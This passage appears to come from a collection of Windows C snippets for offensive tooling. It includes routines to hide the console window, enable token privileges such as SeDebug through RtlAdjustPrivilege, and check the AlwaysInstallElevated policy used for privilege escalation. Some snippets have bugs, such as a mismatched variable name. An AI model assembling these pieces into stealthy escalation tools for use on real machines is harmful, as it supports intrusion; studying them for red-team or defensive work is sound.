#pragma comment(lib, "ws2_32.lib")

BOOL SendIcmpEcho(LPCSTR IpAddress) {

    BOOL                bResult             = FALSE;
    HANDLE              hIcmpFile           = INVALID_HANDLE_VALUE;
    DWORD               dwReplySize         = 0x00,
                        dwReturnValue       = 0x00;
    IPAddr              dwIpAddress         = 0x00;
    LPCSTR              lpSendData          = "Echo";
    PICMP_ECHO_REPLY    pIcmpEchoReply      = NULL;

    if ((dwIpAddress = inet_addr(ipAddress)) == INADDR_NONE) {
        printf("[!] Invalid IP address \n");
        return FALSE;
    }

    if ((hIcmpFile = IcmpCreateFile()) == INVALID_HANDLE_VALUE) {
        printf("[!] IcmpCreateFile Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    dwReplySize  = sizeof(ICMP_ECHO_REPLY) + sizeof(lpSendData) + 0x08;

    if (!(pIcmpEchoReply = (PICMP_ECHO_REPLY)LocalAlloc(LPTR, dwReplySize))) {
        printf("[!] LocalAlloc Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    if ((dwReturnValue = IcmpSendEcho(hIcmpFile, dwIpAddress, (LPVOID)lpSendData, (strlen(lpSendData) + sizeof(CHAR)), NULL, (PVOID)pIcmpEchoReply, dwReplySize, 2 * 1000)) == 0x00) {
        printf("[!] IcmpSendEcho Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    printf("[i] Received %ld Bytes From: %s \n", pIcmpEchoReply->DataSize, ipAddress);
    printf("[i] Round Trip Time: %ldms\n", pIcmpEchoReply->RoundTripTime);

    bResult = TRUE;

_END_OF_FUNC:
    if (pIcmpEchoReply)
        LocalFree(pIcmpEchoReply);
    if (hIcmpFile != INVALID_HANDLE_VALUE)
        IcmpCloseHandle(hIcmpFile);
    return bResult;
}
```
### Hide Console Window Via ShowWindow
```c
#include <windows.h>
BOOL HideConsoleWindow() {
    HWND hWindow = NULL;

    if ((hWindow = GetConsoleWindow()) == NULL) {
        printf("[!] GetConsoleWindow Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    ShowWindow(hWindow, SW_HIDE);
    return TRUE;
}
```
### Print a Hexadecimal Array
```c
#include <windows.h>
#include <stdio.h>
VOID PrintHexArray(IN CONST CHAR* cArrayName, IN PBYTE pBufferData, IN SIZE_T sBufferSize) {

	printf("\nunsigned char %s[%d] = {", cArrayName, (int)sBufferSize);

	for (SIZE_T x = 0; x < sBufferSize; x++){

		if (x % 16 == 0)
			printf("\n\t");

		if (x == sBufferSize - 1)
			printf("0x%0.2X", pBufferData[x]);
		else
			printf("0x%0.2X, ", pBufferData[x]);
	}

	printf("\n};\n");
}
```
### Set Privilege Via RtlAdjustPrivilege
```c
#include <windows.h>
#include <stdio.h>
#define SE_MIN_WELL_KNOWN_PRIVILEGE         2
#define SE_CREATE_TOKEN_PRIVILEGE           2
#define SE_ASSIGNPRIMARYTOKEN_PRIVILEGE     3
#define SE_LOCK_MEMORY_PRIVILEGE            4
#define SE_INCREASE_QUOTA_PRIVILEGE         5
#define SE_MACHINE_ACCOUNT_PRIVILEGE        6
#define SE_TCB_PRIVILEGE                    7
#define SE_SECURITY_PRIVILEGE               8
#define SE_TAKE_OWNERSHIP_PRIVILEGE         9
#define SE_LOAD_DRIVER_PRIVILEGE            10
#define SE_SYSTEM_PROFILE_PRIVILEGE         11
#define SE_SYSTEMTIME_PRIVILEGE             12
#define SE_PROF_SINGLE_PROCESS_PRIVILEGE    13
#define SE_INC_BASE_PRIORITY_PRIVILEGE      14
#define SE_CREATE_PAGEFILE_PRIVILEGE        15
#define SE_CREATE_PERMANENT_PRIVILEGE       16
#define SE_BACKUP_PRIVILEGE                 17
#define SE_RESTORE_PRIVILEGE                18
#define SE_SHUTDOWN_PRIVILEGE               19
#define SE_DEBUG_PRIVILEGE                  20
#define SE_AUDIT_PRIVILEGE                  21
#define SE_SYSTEM_ENVIRONMENT_PRIVILEGE     22
#define SE_CHANGE_NOTIFY_PRIVILEGE          23
#define SE_REMOTE_SHUTDOWN_PRIVILEGE        24
#define SE_UNDOCK_PRIVILEGE                 25
#define SE_SYNC_AGENT_PRIVILEGE             26
#define SE_ENABLE_DELEGATION_PRIVILEGE      27
#define SE_MANAGE_VOLUME_PRIVILEGE          28
#define SE_IMPERSONATE_PRIVILEGE            29
#define SE_CREATE_GLOBAL_PRIVILEGE          30
#define SE_TRUSTED_CREDMAN_ACCESS_PRIVILEGE 31
#define SE_RELABEL_PRIVILEGE                32
#define SE_INC_WORKING_SET_PRIVILEGE        33
#define SE_TIME_ZONE_PRIVILEGE              34
#define SE_CREATE_SYMBOLIC_LINK_PRIVILEGE   35
#define SE_MAX_WELL_KNOWN_PRIVILEGE         SE_CREATE_SYMBOLIC_LINK_PRIVILEGE

typedef NTSTATUS(NTAPI* fnRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

BOOL SetPrivilege(IN DWORD dwPrivCode) {

	NTSTATUS				STATUS                  = 0x00;
	fnRtlAdjustPrivilege	pRtlAdjustPrivilege     = NULL;
	BOOL					bEnabled                = FALSE;

	if (!(pRtlAdjustPrivilege = (fnRtlAdjustPrivilege)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlAdjustPrivilege"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	if ((STATUS = pRtlAdjustPrivilege(dwPrivCode, TRUE, FALSE, &bEnabled)) != 0x00) {
		printf("[!] RtlAdjustPrivilege Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}
```
### Set Privilege Via AdjustTokenPrivileges
```c
#include <windows.h>
#include <stdio.h>
BOOL SetPrivilege(IN HANDLE hToken, IN LPCWSTR szPrivilegeName) {

	TOKEN_PRIVILEGES	TokenPrivs		= { 0x00 };
	LUID				Luid			= { 0x00 };

	if (!LookupPrivilegeValueW(NULL, szPrivilegeName, &Luid)) {
		printf("[!] LookupPrivilegeValueW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	TokenPrivs.PrivilegeCount				= 0x01;
	TokenPrivs.Privileges[0].Luid			= Luid;
	TokenPrivs.Privileges[0].Attributes		= SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		printf("[!] AdjustTokenPrivileges Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		printf("[!] Not All Privileges Referenced Are Assigned To The Caller \n");
		return FALSE;
	}

	return TRUE;
}
```
### Check HKCU AlwaysInstallElevated
```c
#include <windows.h>
#include <stdio.h>
#include <windows.h>
#include <stdio.h>

BOOL CheckHKCUAlwaysInstallElevated() {
    HKEY        hKey            = NULL;
    BOOL        bResult         = FALSE;
    LSTATUS     STATUS          = 0x00;
    DWORD       dwKeyValue      = 0x01,
                dwKeyValueSize  = sizeof(DWORD);

    if ((STATUS = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\Installer", 0, KEY_QUERY_VALUE, &hKey)) != ERROR_SUCCESS) {
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegQueryValueExW(hKey, L"AlwaysInstallElevated", NULL, NULL, &dwKeyValue, &dwKeyValueSize)) != ERROR_SUCCESS) {
        printf("[!] RegQueryValueEx Failed With Error: %d\n", STATUS);
        goto _END_OF_FUNC;
    }

    if (dwKeyValue == 1) {
        bResult = TRUE;
    }

_END_OF_FUNC:
    if (hKey)
        RegCloseKey(hKey);
    return bResult;

}
```
### Check HKLM AlwaysInstallElevated
```c
#include <windows.h>
#include <stdio.h>
#include <windows.h>
#include <stdio.h>

BOOL CheckHKLMAlwaysInstallElevated() {
    HKEY        hKey            = NULL;
    BOOL        bResult         = FALSE;
    LSTATUS     STATUS          = 0x00;
    DWORD       dwKeyValue      = 0x01,
                dwKeyValueSize  = sizeof(DWORD);

    if ((STATUS = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Policies\\Microsoft\\Windows\\Installer", 0, KEY_QUERY_VALUE, &hKey)) != ERROR_SUCCESS) {
        goto _END_OF_FUNC;
    }

    if ((STATUS = RegQueryValueExW(hKey, L"AlwaysInstallElevated", NULL, NULL, &dwKeyValue, &dwKeyValueSize)) != ERROR_SUCCESS) {
        printf("[!] RegQueryValueEx Failed With Error: %d\n", STATUS);
        goto _END_OF_FUNC;
    }

    if (dwKeyValue == 1) {
        bResult = TRUE;
    }

_END_OF_FUNC:
    if (hKey)
        RegCloseKey(hKey);
    return bResult;

}
```

